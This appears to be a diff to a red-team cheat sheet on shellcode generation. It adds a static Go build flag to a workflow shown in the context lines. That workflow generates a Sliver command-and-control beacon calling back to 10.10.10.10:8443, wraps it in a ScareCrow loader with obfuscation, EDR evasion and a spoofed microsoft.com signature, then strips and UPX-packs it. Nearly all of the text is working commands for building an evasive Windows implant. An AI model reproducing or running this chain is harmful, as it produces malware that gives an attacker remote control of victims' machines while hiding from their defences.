@@ -157,6 +157,9 @@ Shellcode generation
 generate beacon --mtls  10.10.10.10:8443 --arch amd64 --os windows --save /tmp/8443-sliver.bin -f shellcode -G
 # use 
 /opt/ScareCrow/ScareCrow -I /tmp/8443-sliver.bin -Loader binary -domain microsoft.com -obfu -Evasion KnownDLL 
+# Add For static without c runtime libraries
+CGO_ENABLED=0 go build
+
 # Build with golang
 GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
 # Pack with upx
